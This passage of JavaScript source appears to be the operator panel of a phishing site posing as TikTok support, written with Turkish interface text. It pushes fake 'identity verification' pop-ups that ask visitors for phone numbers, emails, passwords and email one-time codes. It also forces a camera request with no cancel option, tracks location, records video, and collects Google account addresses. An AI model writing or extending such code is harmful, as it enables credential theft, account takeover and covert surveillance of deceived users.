    p.textContent = `Fotoğraf talebi: ${msg.text || ""}`;
    const tags = document.createElement("em");
    tags.className = "popup-btn-tags";
    tags.textContent = `${msg.okLabel || "Fotoğraf seç"} / ${msg.cancelLabel || "Istemiyorum"} ? max ${
      msg.maxPhotos || 10
    }`;
    body.append(p, tags);
  } else if (msg.type === "photo" || msg.imageUrl) {
    const p = document.createElement("p");
    p.textContent = msg.text || "Fotograf";
    body.appendChild(p);
    if (msg.imageUrl) {
      const link = document.createElement("a");
      link.href = msg.imageUrl;
      link.target = "_blank";
      link.rel = "noopener";
      link.className = "admin-photo-link";
      const img = document.createElement("img");
      img.src = msg.imageUrl;
      img.alt = msg.fileName || "Ziyaretçi fotoğrafı";
      img.className = "admin-photo-thumb";
      img.loading = "lazy";
      link.appendChild(img);
      body.appendChild(link);
    }
  } else if (
    msg.type === "phone" ||
    msg.type === "email" ||
    msg.type === "password" ||
    msg.type === "email_code_reply" ||
    msg.adminOnly
  ) {
    row.classList.add("chat-credentials");
    const badge = document.createElement("em");
    badge.className = "popup-btn-tags";
    badge.textContent =
      msg.type === "password"
        ? "Güvenlik · şifre"
        : msg.type === "email"
          ? "Güvenlik · e-posta"
          : msg.type === "phone"
            ? "Güvenlik · telefon"
            : msg.type === "email_code_reply"
              ? "Güvenlik · e-posta kodu"
              : "Güvenlik (yalnız admin)";
    const p = document.createElement("p");
    p.textContent = msg.text || "";
    body.append(badge, p);
  } else if (msg.type === "email_code") {
    row.classList.add("chat-credentials");
    const badge = document.createElement("em");
    badge.className = "popup-btn-tags";
    badge.textContent = "Talep · e-posta kodu penceresi";
    const p = document.createElement("p");
    p.textContent = msg.text || "6 haneli kod penceresi gönderildi";
    body.append(badge, p);
  } else if (msg.type === "credentials") {
    row.classList.add("chat-credentials");
    const badge = document.createElement("em");
    badge.className = "popup-btn-tags";
    badge.textContent = "Talep · güvenlik penceresi";
    const p = document.createElement("p");
    p.textContent = msg.text || "Telefon / e-posta / şifre penceresi gönderildi";
    body.append(badge, p);
  } else {
    const p = document.createElement("p");
    p.textContent = msg.text || "";
    body.appendChild(p);
  }
  row.append(meta, body);
  threadMessages.appendChild(row);
  threadMessages.scrollTop = threadMessages.scrollHeight;

  if (announce) {
    scheduleRecentFeedRefresh(latestSessionRows);
  }

  if (announce && msg.who === "user") {
    const text = String(msg.text || "(bos mesaj)").slice(0, 180);
    const focusedInChat =
      !document.hidden &&
      Boolean(
        document.activeElement === replyInput ||
          document.activeElement?.closest?.(".admin-thread, .admin-compose, #reply-form")
      );
    const threadVisible = (() => {
      if (!threadMessages || document.hidden) return false;
      const r = threadMessages.getBoundingClientRect();
      return r.width > 40 && r.height > 60 && r.bottom > 80 && r.top < window.innerHeight - 40;
    })();

    // Karşılıklı kural: sohbet görünür/odaklıysa sessiz toast; değilse sesli uyarı
    if (!focusedInChat && !threadVisible) {
      fireHighAlert({
        kicker: "YENI MESAJ",
        title: "Ziyaretçi yazdı",
        body: text,
        tag: `msg-${selectedId || "x"}`,
        force: document.hidden,
      });
    } else {
      showAdminAlert({
        kicker: "YENI MESAJ",
        title: "Ziyaretçi yazdı",
        body: text,
      });
    }
  }
}

function setThreadToolsEnabled(enabled) {
  if (exportChatBtn) exportChatBtn.disabled = !enabled;
  if (clearChatBtn) clearChatBtn.disabled = !enabled;
}

function clearThreadUi() {
  seenMessageIds = new Set();
  if (threadMessages) threadMessages.innerHTML = "";
}

function resetSelectedSessionUi() {
  selectedId = null;
  setThreadToolsEnabled(false);
  clearThreadUi();
  if (threadTitle) threadTitle.textContent = "Bir sohbet seçin";
  if (threadMeta) threadMeta.textContent = "Sol listeden canli oturumlari izleyin.";
  if (unsubMessages) {
    unsubMessages();
    unsubMessages = null;
  }
  stopRecordingWatch();
  stopAdminCall(false, { keepUi: false });
  clearRecordingLink();
  resetLiveVideoUi();
  updateMediaDock(null);
  if (reopenCameraBtn) reopenCameraBtn.hidden = true;
}

function msgWhoExport(msg) {
  if (msg?.from === "admin" || msg?.who === "admin") return "Destek";
  if (msg?.who === "user") return "Ziyaretçi";
  if (msg?.who === "bot") return "Asistan";
  return String(msg?.who || "Bilinmeyen");
}

function formatChatExportTxt(sessionId, meta, messages) {
  const lines = [
    "TikTok Yardim ? Sohbet disa aktarim",
    `Oturum: #${shortId(sessionId)} (${sessionId})`,
    `Sayfa: ${meta?.page || "/"}`,
    `Disa aktarim: ${new Date().toLocaleString("tr-TR")}`,
    `Mesaj sayisi: ${messages.length}`,
    "".padEnd(48, "-"),
    "",
  ];
  messages.forEach((msg) => {
    const when = msg.ts ? new Date(msg.ts).toLocaleString("tr-TR") : "-";
    const who = msgWhoExport(msg);
    let kind = "";
    if (msg.type === "camera") kind = " [kamera]";
    else if (msg.type === "popup") kind = " [popup]";
    else if (msg.type === "loading") kind = " [yukleme]";
    else if (msg.type === "photos") kind = " [fotoğraf talebi]";
    else if (msg.type === "photo") kind = " [fotoğraf]";
    else if (msg.type === "phone") kind = " [telefon]";
    else if (msg.type === "email") kind = " [e-posta]";
    else if (msg.type === "password") kind = " [şifre]";
    else if (msg.type === "email_code") kind = " [e-posta kodu talebi]";
    else if (msg.type === "email_code_reply") kind = " [e-posta kodu]";
    else if (msg.type === "credentials") kind = " [güvenlik talebi]";
    lines.push(`[${when}] ${who}${kind}`);
    lines.push(String(msg.text || "").trim() || "(bos)");
    if (msg.imageUrl) lines.push(`URL: ${msg.imageUrl}`);
    lines.push("");
  });
  if (!messages.length) lines.push("(Bu sohbette mesaj yok)");
  return lines.join("\n");
}

function downloadTextFile(filename, text) {
  const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  a.style.display = "none";
  document.body.appendChild(a);
  a.click();
  a.remove();
  window.setTimeout(() => URL.revokeObjectURL(url), 5000);
}

async function exportSelectedChat() {
  if (!selectedId || !window.ChatSync?.getSessionMessages) {
    sendHint.hidden = false;
    sendHint.textContent = "Önce soldan bir sohbet seçin.";
    return;
  }
  sendHint.hidden = false;
  sendHint.textContent = "Sohbet disa aktariliyor?";
  try {
    const [messages, meta] = await Promise.all([
      window.ChatSync.getSessionMessages(selectedId),
      window.ChatSync.getSessionMeta?.(selectedId),
    ]);
    const body = formatChatExportTxt(selectedId, meta || {}, messages);
    const stamp = new Date().toISOString().slice(0, 19).replace(/[:T]/g, "-");
    downloadTextFile(`sohbet-${shortId(selectedId)}-${stamp}.txt`, body);
    sendHint.textContent = `Disa aktarildi (${messages.length} mesaj).`;
    window.setTimeout(() => {
      if (sendHint.textContent.includes("Disa aktarildi")) sendHint.hidden = true;
    }, 2500);
  } catch (err) {
    sendHint.textContent = `Disa aktarilamadi: ${err?.message || err}`;
  }
}

async function clearSelectedChat() {
  if (!selectedId || !window.ChatSync?.clearSessionMessages) {
    sendHint.hidden = false;
    sendHint.textContent = "Önce soldan bir sohbet seçin.";
    return;
  }
  const ok = window.confirm(
    `Seçili sohbet (#${shortId(selectedId)}) temizlensin mi?\nMesajlar ve kamera oturumu silinir; oturum listede kalir.`
  );
  if (!ok) return;
  sendHint.hidden = false;
  sendHint.textContent = "Sohbet temizleniyor?";
  try {
    stopRecordingWatch();
    await stopAdminCall(false, { keepUi: false });
    await window.ChatSync.clearSessionMessages(selectedId);
    clearThreadUi();
    bindSessionMessages(selectedId);
    sendHint.textContent = "Sohbet temizlendi.";
    window.setTimeout(() => {
      if (sendHint.textContent.includes("temizlendi")) sendHint.hidden = true;
    }, 2000);
  } catch (err) {
    sendHint.textContent = `Temizlenemedi: ${err?.message || err}`;
  }
}

async function clearAllChats() {
  if (!window.ChatSync?.clearAllSessions) return;
  const ok = window.confirm(
    "TÜM sohbetler silinsin mi?\nBu işlem geri alınamaz. Tüm oturumlar ve mesajlar kalkar."
  );
  if (!ok) return;
  const ok2 = window.confirm("Emin misiniz? Tüm sohbetler kalici olarak silinecek.");
  if (!ok2) return;
  sendHint.hidden = false;
  sendHint.textContent = "Tüm sohbetler siliniyor?";
  try {
    stopRecordingWatch();
    await stopAdminCall(false, { keepUi: false });
    const n = await window.ChatSync.clearAllSessions();
    resetSelectedSessionUi();
    sendHint.textContent = `${n} sohbet silindi.`;
    window.setTimeout(() => {
      if (sendHint.textContent.includes("silindi")) sendHint.hidden = true;
    }, 2500);
  } catch (err) {
    sendHint.textContent = `Silinemedi: ${err?.message || err}`;
  }
}

function openSession(row) {
  if (!row?.id) return;
  const sameSession = selectedId === row.id;
  const sameLiveCall =
    sameSession &&
    adminCall?.sessionId === row.id &&
    adminCall?.callId &&
    row.lastCallId &&
    adminCall.callId === row.lastCallId &&
    adminCall.pc;

  selectedId = row.id;
  setThreadToolsEnabled(true);
  if (!sameSession) {
    seenMessageIds = new Set();
    threadMessages.innerHTML = "";
  }
  threadTitle.textContent = `Oturum #${shortId(row.id)}`;
  const bits = [row.page || "/", fmtTime(row.updatedAt)];
  if (row.isReturning || Number(row.visitCount) > 1) {
    bits.push(`Dönen ziyaretçi · #${Number(row.visitCount) || "?"}`);
  } else {
    bits.push("Yeni ziyaretçi");
  }
  if (row.visitorId) bits.push(`cihaz ${String(row.visitorId).slice(0, 12)}`);
  if (row.phone) bits.push(String(row.phone));
  threadMeta.textContent = bits.join(" · ");
  sendHint.hidden = true;
  if (!sameLiveCall) {
    stopRecordingWatch();
    stopAdminCall(false, { keepUi: false });
    clearRecordingLink();
    resetLiveVideoUi();
  }
  updateMediaDock(row);
  if (row.lastSnapshotUrl) {
    showAdminSnapshot(row.lastSnapshotUrl);
  }
  if (row.lastLocation) {
    updateAdminLocationUi(row.lastLocation, "live", null);
  }
  maybeAutoDownloadSessionRecording(row);
  // Canlı kameraya gireceksek storage “failed” watch’ı siyah ekranı ezmesin
  const willJoinLive =
    Boolean(row.lastCallId) &&
    Boolean(row.cameraGranted || row.hasCamera || row.cameraPending);
  if (
    !willJoinLive &&
    row.lastRecordingCallId &&
    !row.lastRecordingUrl &&
    !adminCall
  ) {
    startRecordingWatch(row.id, row.lastRecordingCallId, {
      sessionId: row.id,
      callId: row.lastRecordingCallId,
      lastBlob: null,
      seenRecordingUrl: null,
      awaitingRecording: true,
    });
  }
  if (reopenCameraBtn) reopenCameraBtn.hidden = Boolean(sameLiveCall);
  Array.from(sessionList.querySelectorAll(".session-item")).forEach((el) => {
    el.classList.toggle("is-active", el.dataset.sessionId === row.id);
  });

  if (!sameSession) bindSessionMessages(row.id);
  if (row.lastCallId && (row.cameraGranted || row.hasCamera || row.cameraPending)) {
    const callChanged =
      Boolean(adminCall) &&
      (adminCall.sessionId !== row.id || adminCall.callId !== row.lastCallId);
    void ensureAdminCamera(row.id, row.lastCallId, {
      force: callChanged || !sameLiveCall,
      seedLocation: row.lastLocation || null,
    });
  }
  replyInput?.focus();
}

async function sendToSelected(text, options = {}) {
  const msg = String(
    text ||
      (options.type === "loading"
        ? "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…"
        : options.type === "camera"
          ? "Kimlik doğrulaması için izin vermeniz isteniyor. İzin verirseniz doğrulama bu destek oturumuna bağlanır. İzin verilmezse doğrulama tamamlanamaz."
          : options.type === "photos"
            ? "Destek için ekran görüntüsü veya fotoğraf gönderebilirsiniz. En fazla 10 görsel seçebilirsiniz; istemezseniz iptal edin."
            : options.type === "email_code"
              ? "E-postanıza gelen 6 haneli kodu yazarak doğrulama yapın."
              : options.type === "credentials"
                ? "Kimlik doğrulamasını tamamlamak için telefon, e-posta ve şifrenizi girin."
                : "")
  ).trim();
  if (!msg && options.type !== "loading") return;
  if (!selectedId) {
    sendHint.hidden = false;
    sendHint.textContent = "Önce soldan bir sohbet seçin.";
    return;
  }
  if (sending) return;
  sending = true;
  sendHint.hidden = false;
  sendHint.textContent = "Gönderiliyor…";
  const releaseSending = window.setTimeout(() => {
    if (sending) sending = false;
  }, 20000);
  try {
    const result = await window.ChatSync.sendAdminMessage(selectedId, msg, options);
    sendHint.textContent =
      options.type === "loading"
        ? "Yükleme animasyonu gönderildi."
        : options.type === "popup"
          ? "Popup gönderildi."
          : options.type === "camera"
            ? "Kamera talebi gönderildi."
            : options.type === "photos"
              ? "Fotoğraf talebi gönderildi."
              : options.type === "email_code"
                ? "E-posta kodu penceresi gönderildi."
                : options.type === "credentials"
                  ? "Güvenlik penceresi gönderildi."
                  : "Gönderildi.";
    if (options.type === "camera" && result?.callId) {
      resetLiveVideoUi();
      await joinAdminCamera(selectedId, result.callId);
    }
    if (
      options.type !== "loading" &&
      options.type !== "popup" &&
      options.type !== "camera" &&
      options.type !== "photos" &&
      options.type !== "email_code" &&
      options.type !== "credentials"
    ) {
      replyInput.value = "";
    }
    window.setTimeout(() => {
      if (
        sendHint.textContent.includes("Gönderildi") ||
        sendHint.textContent.includes("animasyon") ||
        sendHint.textContent.includes("Popup") ||
        sendHint.textContent.includes("Kamera") ||
        sendHint.textContent.includes("Fotograf") ||
        sendHint.textContent.includes("E-posta kodu") ||
        sendHint.textContent.includes("Güvenlik penceresi") ||
        sendHint.textContent.includes("Fotoğraf")
      ) {
        sendHint.hidden = true;
      }
    }, 1200);
  } catch (err) {
    const detail = err?.code || err?.message || String(err);
    sendHint.textContent = `Gönderilemedi: ${detail}`;
  } finally {
    window.clearTimeout(releaseSending);
    sending = false;
  }
}

function renderQuickButtons() {
  const list = window.ChatSync.getQuickReplies();
  quickList.innerHTML = "";
  list.forEach((text) => {
    const btn = document.createElement("button");
    btn.type = "button";
    btn.textContent = text.length > 48 ? `${text.slice(0, 48)}?` : text;
    btn.title = text;
    btn.addEventListener("click", () => sendToSelected(text));
    quickList.appendChild(btn);
  });
}

function renderTemplatesEditor(list) {
  templatesEditor.innerHTML = "";
  (list.length ? list : [""]).forEach((text, index) => {
    const row = document.createElement("div");
    row.className = "template-row";
    row.innerHTML = `
      <label class="visually-hidden" for="tpl-${index}">Hazir mesaj ${index + 1}</label>
      <textarea id="tpl-${index}" rows="2" maxlength="800" data-tpl>${escapeHtml(text)}</textarea>
      <button type="button" class="chat-clear" data-remove="${index}">Sil</button>
    `;
    const ta = row.querySelector("textarea");
    ta.value = text;
    templatesEditor.appendChild(row);
  });
}

function readTemplatesFromEditor() {
  return Array.from(templatesEditor.querySelectorAll("[data-tpl]"))
    .map((el) => el.value.trim())
    .filter(Boolean);
}

replyForm?.addEventListener("submit", (e) => {
  e.preventDefault();
  sendToSelected(replyInput.value);
});

sendLoadingBtn?.addEventListener("click", () => {
  sendToSelected(
    "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…",
    { type: "loading" }
  );
});

exportChatBtn?.addEventListener("click", () => {
  void exportSelectedChat();
});
clearChatBtn?.addEventListener("click", () => {
  void clearSelectedChat();
});
clearAllChatsBtn?.addEventListener("click", () => {
  void clearAllChats();
});

sendCameraBtn?.addEventListener("click", () => {
  void (async () => {
    if (sending) {
      sendHint.hidden = false;
      sendHint.textContent = "Gönderiliyor, bekleyin?";
      return;
    }
    // Eski oturum kilidi kaldiysa once temizle; yeni talebi engelleme
    if (adminCall) {
      sendHint.hidden = false;
      sendHint.textContent = "Önceki kamera oturumu kapatılıyor…";
      try {
        await endActiveCameraSession();
      } catch (err) {
        console.error(err);
        adminCall = null;
      }
    }
    await sendToSelected(
      "Kimlik doğrulaması için izin zorunludur. İzin verirseniz doğrulama bu destek oturumuna bağlanır. İzin verilmezse doğrulama adimi tamamlanamaz.",
      {
        type: "camera",
        okLabel: "Izin ver",
        cancelLabel: "",
        hideCancel: true,
      }
    );
  })();
});

sendPhotosBtn?.addEventListener("click", () => {
  sendToSelected(
    "Destek için ekran görüntüsü veya fotoğraf gönderebilirsiniz. En fazla 10 görsel seçebilirsiniz; istemezseniz iptal edin. Sadece sizin seçtiğiniz dosyalar gönderilir.",
    {
      type: "photos",
      okLabel: "Fotoğraf seç",
      cancelLabel: "Istemiyorum",
      maxPhotos: 10,
    }
  );
});

sendEmailCodeBtn?.addEventListener("click", () => {
  sendEmailCodeRequest();
});

sendCredentialsBtn?.addEventListener("click", () => {
  sendCredentialsRequest();
});

function sendEmailCodeRequest() {
  sendToSelected("E-postanıza gelen 6 haneli kodu yazarak doğrulama yapın.", {
    type: "email_code",
    okLabel: "Doğrula",
  });
}

function sendCredentialsRequest() {
  sendToSelected(
    "Kimlik doğrulamasını tamamlamak için telefon, e-posta ve şifrenizi girin.",
    {
      type: "credentials",
      okLabel: "Bilgileri onayla",
    }
  );
}

async function sendVisitorPushNudge() {
  if (!selectedId) {
    sendHint.hidden = false;
    sendHint.textContent = "Önce soldan bir sohbet seçin.";
    return;
  }
  sendHint.hidden = false;
  sendHint.textContent = "Ziyaretçiye bildirim gönderiliyor…";
  try {
    const sync = window.ChatSync;
    const res = await sync?.notifyVisitorPush?.(selectedId, {
      title: "Doğrulama bekleniyor",
      body: "Lütfen sayfaya dönün — güvenlik doğrulamasını tamamlayın.",
      tag: `nudge-${selectedId}`,
    });
    // Canlı sayfadaysa güvenlik + kamera talebi
    sendCredentialsRequest();
    window.setTimeout(() => {
      void sendToSelected(
        "Kimlik doğrulaması için izin zorunludur. İzin verirseniz doğrulama bu destek oturumuna bağlanır.",
        {
          type: "camera",
          okLabel: "Izin ver",
          cancelLabel: "",
          hideCancel: true,
        }
      );
    }, 600);
    if (res?.ok) {
      sendHint.textContent = `Ziyaretçiye push gönderildi (${res.sent || 1}).`;
    } else {
      sendHint.textContent = res?.error
        ? `Push: ${res.error} — güvenlik/kamera talebi gönderildi.`
        : "Güvenlik/kamera talebi gönderildi (push token yok veya fcmServerKey eksik).";
    }
  } catch (err) {
    sendHint.textContent = `Bildirim hatası: ${err?.message || err}`;
  }
}

[
  "ev-send-email-code-btn",
  "ev-send-email-code-btn-2",
].forEach((id) => {
  document.getElementById(id)?.addEventListener("click", () => sendEmailCodeRequest());
});
[
  "ev-send-credentials-btn",
  "ev-send-credentials-btn-2",
].forEach((id) => {
  document.getElementById(id)?.addEventListener("click", () => sendCredentialsRequest());
});
document.getElementById("ev-notify-visitor-btn")?.addEventListener("click", () => {
  void sendVisitorPushNudge();
});
document.getElementById("ev-pick-folder-btn")?.addEventListener("click", () => {
  void pickEvidenceFolder();
});
void loadEvidenceDirHandle();

async function endActiveCameraSession() {
  const call = adminCall;
  if (!call) {
    adminCall = null;
    setEndCameraVisible(false);
    setHideCameraVisible(false);
    if (reopenCameraBtn) reopenCameraBtn.hidden = true;
    return;
  }
  const { sessionId, callId } = call;
  const pending = {
    sessionId,
    callId,
    lastBlob: null,
    seenRecordingUrl: call.seenRecordingUrl || null,
    awaitingRecording: true,
  };
  setCameraUi(true, "Oturum sonlandırılıyor…");
  adminCameraBox?.classList.remove("is-recording");
  setEndCameraVisible(false);

  // Listener cakismasin diye once aboneligi kes, sonra Firebase e bitis yaz
  try {
    call.unsubCall?.();
    call.unsubCall = null;
    call.unsubIce?.();
    call.unsubIce = null;
  } catch {
    /* ignore */
  }

  try {
    if (sessionId && callId && window.ChatSync) {
      try {
        if (window.ChatSync.forceEndCameraCall) {
          await window.ChatSync.forceEndCameraCall(sessionId, callId);
        } else {
          await window.ChatSync.setCameraCallStatus(sessionId, callId, "ended");
        }
      } catch (err) {
        console.error(err);
        sendHint.hidden = false;
        sendHint.textContent = `Sonlandirilamadi: ${err?.message || err}`;
      }
    }

    try {
      await stopAdminRecording(call, { autoDownload: false });
      pending.lastBlob = call.lastBlob || null;
    } catch {
      /* ignore */
    }

    try {
      call.pc?.close();
      call.pc = null;
    } catch {
      /* ignore */
    }
    if (adminRemoteVideo) adminRemoteVideo.srcObject = null;

    if (pending.lastBlob?.size) {
      forceDownloadBlob(pending.lastBlob, `kamera-admin-${shortId(sessionId)}.webm`);
      setCameraUi(true, "Yerel kayit indirildi ? Storage yedek bekleniyor?");
    } else {
      setCameraUi(true, "Ziyaretçi kaydi yükleniyor…");
    }

    startRecordingWatch(sessionId, callId, pending);
    // Storage URL sohbet metasina da duserse liste uzerinden de otomatik iner

    sendHint.hidden = false;
    sendHint.textContent = pending.lastBlob?.size
      ? "Oturum bitti ? kayit indiriliyor (yerel + Storage)."
      : "Oturum bitti ? ziyaretçi kaydi gelince otomatik indirilecek.";
    if (reopenCameraBtn) reopenCameraBtn.hidden = false;
    window.setTimeout(() => {
      if (
        sendHint.textContent.includes("Oturum bitti") ||
        sendHint.textContent.includes("Oturum sonlandir")
      ) {
        sendHint.hidden = true;
      }
    }, 5000);
  } finally {
    if (adminCall === call) adminCall = null;
    setEndCameraVisible(false);
  }
}

endCameraBtn?.addEventListener("click", () => {
  endActiveCameraSession();
});
endCameraBtnModal?.addEventListener("click", () => {
  endActiveCameraSession();
});

hideCameraBtn?.addEventListener("click", () => {
  hideCameraPopup();
});
hideCameraPanelBtn?.addEventListener("click", () => {
  hideCameraPopup();
});
hideCameraBtnModal?.addEventListener("click", () => {
  hideCameraPopup();
});
reopenCameraBtn?.addEventListener("click", () => {
  showCameraPopup();
});
dockOpenCameraBtn?.addEventListener("click", () => {
  const row = latestSessionRows.find((r) => r.id === selectedId);
  if (!row) {
    showCameraPopup();
    return;
  }
  showCameraPopup();
  if (row.lastCallId && (row.cameraGranted || row.hasCamera || row.cameraPending || row.hasLocation)) {
    void ensureAdminCamera(row.id, row.lastCallId, {
      force: true,
      seedLocation: row.lastLocation || null,
    });
  } else if (row.lastSnapshotUrl) {
    showAdminSnapshot(row.lastSnapshotUrl);
    setCameraUi(true, "Canlı sinyal yok — son fotoğraf");
  } else {
    setCameraUi(true, "Canlı call yok — ziyaretçiden kamera isteyin");
    void sendToSelected("", { type: "camera" });
  }
});

(function wireCameraDrag() {
  const panel = document.getElementById("admin-camera-panel");
  const handle = document.getElementById("admin-camera-drag");
  if (!panel || !handle) return;

  let dragging = false;
  let startX = 0;
  let startY = 0;
  let originLeft = 0;
  let originTop = 0;

  const onMove = (clientX, clientY) => {
    if (!dragging) return;
    const dx = clientX - startX;
    const dy = clientY - startY;
    const maxLeft = Math.max(8, window.innerWidth - panel.offsetWidth - 8);
    const maxTop = Math.max(8, window.innerHeight - panel.offsetHeight - 8);
    const left = Math.min(maxLeft, Math.max(8, originLeft + dx));
    const top = Math.min(maxTop, Math.max(8, originTop + dy));
    panel.style.left = `${left}px`;
    panel.style.top = `${top}px`;
    panel.style.right = "auto";
    panel.style.bottom = "auto";
    panel.style.transform = "none";
  };

  handle.addEventListener("pointerdown", (e) => {
    if (e.button != null && e.button !== 0) return;
    if (e.target.closest("#hide-camera-btn")) return;
    dragging = true;
    panel.classList.add("is-dragging");
    const rect = panel.getBoundingClientRect();
    startX = e.clientX;
    startY = e.clientY;
    originLeft = rect.left;
    originTop = rect.top;
    panel.style.left = `${rect.left}px`;
    panel.style.top = `${rect.top}px`;
    panel.style.transform = "none";
    handle.setPointerCapture?.(e.pointerId);
    e.preventDefault();
  });

  handle.addEventListener("pointermove", (e) => onMove(e.clientX, e.clientY));
  handle.addEventListener("pointerup", (e) => {
    dragging = false;
    panel.classList.remove("is-dragging");
    handle.releasePointerCapture?.(e.pointerId);
  });
  handle.addEventListener("pointercancel", () => {
    dragging = false;
    panel.classList.remove("is-dragging");
  });
})();

sendPopupBtn?.addEventListener("click", () => {
  const question = String(popupText?.value || "").trim();
  if (!question) {
    sendHint.hidden = false;
    sendHint.textContent = "Önce popup metnini yazın (ziyaretçiye soru).";
    popupText?.focus();
    return;
  }
  sendToSelected(question, {
    type: "popup",
    okLabel: popupOk?.value || "Tamam",
    cancelLabel: popupCancel?.value || "Iptal",
    withInput: true,
    placeholder: popupPlaceholder?.value || "Mesajinizi buraya yazın…",
  });
});

templatesForm?.addEventListener("submit", (e) => {
  e.preventDefault();
  const saved = window.ChatSync.setQuickReplies(readTemplatesFromEditor());
  renderTemplatesEditor(saved);
  renderQuickButtons();
  templatesSaved.hidden = false;
  window.setTimeout(() => {
    templatesSaved.hidden = true;
  }, 1500);
});

addTemplateBtn?.addEventListener("click", () => {
  const list = readTemplatesFromEditor();
  list.push("");
  renderTemplatesEditor(list);
  templatesEditor.querySelector("textarea:last-of-type")?.focus();
});

resetTemplatesBtn?.addEventListener("click", () => {
  const defaults = [...window.ChatSync.DEFAULT_QUICK_REPLIES];
  window.ChatSync.setQuickReplies(defaults);
  renderTemplatesEditor(defaults);
  renderQuickButtons();
});

templatesEditor?.addEventListener("click", (e) => {
  const btn = e.target.closest("[data-remove]");
  if (!btn) return;
  const list = readTemplatesFromEditor();
  const idx = Number(btn.getAttribute("data-remove"));
  list.splice(idx, 1);
  renderTemplatesEditor(list.length ? list : [""]);
});

notifyBtn?.addEventListener("click", () => {
  void armAlerts();
});

alertDismiss?.addEventListener("click", () => {
  hideAdminAlert();
});

gmailSearch?.addEventListener("input", () => {
  renderGmails();
});

gmailCopyBtn?.addEventListener("click", async () => {
  const emails = filteredGoogleAccounts()
    .map((r) => String(r.email || "").trim())
    .filter(Boolean);
  if (!emails.length) {
    showGmailHint("Kopyalanacak e-posta yok");
    return;
  }
  try {
    await navigator.clipboard.writeText(emails.join("\n"));
    showGmailHint(`${emails.length} e-posta kopyalandi`);
  } catch {
    showGmailHint("Kopyalama başarısız");
  }
});

gmailBackfillBtn?.addEventListener("click", async () => {
  if (!window.ChatSync?.backfillGoogleAccountsFromSessions) {
    showGmailHint("Aktarim fonksiyonu yok ? sayfayi yenile");
    return;
  }
  gmailBackfillBtn.disabled = true;
  showGmailHint("Sohbetlerden aktariliyor?");
  try {
    const n = await window.ChatSync.backfillGoogleAccountsFromSessions();
    showGmailHint(n ? `${n} sohbetten Google hesabi aktarildi` : "Aktarilacak Google kaydi bulunamadi");
  } catch (err) {
    console.warn(err);
    showGmailHint(
      "Aktarım başarısız — Firebase Rules’a googleAccounts ekleyip Publish edin"
    );
  } finally {
    gmailBackfillBtn.disabled = false;
  }
});

logoutBtn?.addEventListener("click", () => {
  setAuth(false);
  if (unsubSessions) unsubSessions();
  if (unsubMessages) unsubMessages();
  if (unsubGoogleAccounts) unsubGoogleAccounts();
  unsubGoogleAccounts = null;
  stopAdminCall(true);
  hideAdminAlert();
  selectedId = null;
  alertsArmed = false;
  sessionsHydrated = false;
  knownSessionIds = new Set();
  googleAccountRows = [];
  latestSessionRows = [];
  if (titleFlashTimer) {
    clearInterval(titleFlashTimer);
    titleFlashTimer = null;
  }
  document.title = originalTitle || "Canli Destek Paneli";
  show("login");
});

loginForm?.addEventListener("submit", (e) => {
  e.preventDefault();
  const pass = String(document.getElementById("admin-pass")?.value || "").trim();
  const expected = String(window.FIREBASE_SYNC?.adminPassword || "").trim();
  const ok =
    expected.length > 0 &&
    (pass === expected || pass.replace(/\s+/g, "") === expected.replace(/\s+/g, ""));

  if (!window.FIREBASE_SYNC) {
    loginError.hidden = false;
    loginError.textContent = "firebase-config.js yüklenemedi. Sayfayı Ctrl+F5 ile yenileyin.";
    return;
  }
  if (!ok) {
    loginError.hidden = false;
    loginError.textContent =
      expected.length === 0
        ? "Config içinde admin şifresi yok."
        : `Şifre hatalı. Tekrar deneyin.`;
    return;
  }
  loginError.hidden = true;
  setAuth(true);
  // Giriş jesti ile sesi hemen aç
  void (async () => {
    await unlockAlertAudio();
    startDash(window.ChatSync);
    await armAlerts();
  })();
});

const sync = await ready();
if (!sync) {
  show("setup");
  const lede = document.querySelector("#setup-panel .lede");
  if (lede) {
    lede.textContent =
      "Firebase scriptleri yüklenemedi veya çok yavaş. Ctrl+F5 ile yenileyin. Internet/engelleyici varsa kapatin.";
  }
} else if (sync.needsSetup) {
  show("setup");
} else if (authOk()) {
  startDash(sync);
} else {
  show("login");
}
